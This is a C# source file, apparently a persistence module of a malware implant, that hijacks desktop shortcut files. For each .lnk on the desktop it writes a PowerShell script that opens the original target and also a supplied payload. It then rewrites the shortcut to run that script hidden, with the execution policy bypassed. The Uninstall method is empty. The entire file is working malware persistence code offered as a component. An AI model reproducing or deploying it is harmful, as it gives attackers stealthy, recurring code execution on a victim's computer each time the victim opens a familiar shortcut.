using System.Text;

namespace Main.Source.Functions.Persistence
{
    public class ImpersonateLNKs
    {
        private const string ShortcutsFolderName = "Saved Links";

        private static string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        private static string shortcutsFolderPath = Path.Join(userProfile, ShortcutsFolderName);

        public static void Install(string path)
        {
            if (!Directory.Exists(shortcutsFolderPath))
            {
                Directory.CreateDirectory(shortcutsFolderPath);
            }

            var links = FindLNKs();
            if (links.Count == 0)
            {
                Utilities.Logger.Error("ImpersonateLNKs.Install: there are no link files");
                return;
            }

            foreach (var link in links)
            {
                var info = Utilities.Shortcut.GetShortcutInfo(link);
                if (info == null)
                {
                    continue;
                }

                string scriptName = Path.GetFileNameWithoutExtension(link) + ".ps1";
                string scriptPath = Path.Join(shortcutsFolderPath, scriptName);

                var content = new StringBuilder();
                content.AppendLine($"Set-Location -Path {info.OpenIn}");
                content.AppendLine($"Start-Process -Path {info.Target}");
                content.AppendLine($"Start-Process -Path {path}");

                File.WriteAllText(scriptPath, content.ToString());

                Utilities.Shortcut.OverwriteShortcut(
                    Path.GetFullPath(link),
                    target: $"powershell.exe -nop -ep Bypass -w Hidden -File \"{scriptPath}\"",
                    openIn: shortcutsFolderPath
                );
            }
        }
        
        public static void Uninstall()
        {

        }

        public static int Check()
        {
            if (!Directory.Exists(shortcutsFolderPath))
            {
                return 0;
            }

            return Utilities.Files.CountFiles(shortcutsFolderPath);
        }

        private static List<string> FindLNKs()
        {
            var files = new List<string>();

            string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            foreach (var file in Directory.GetFiles(desktop))
            {
                if (!file.EndsWith(".lnk", StringComparison.OrdinalIgnoreCase))
                {
                    continue;
                }

                files.Add(file);
            }

            return files;
        }
    }
}
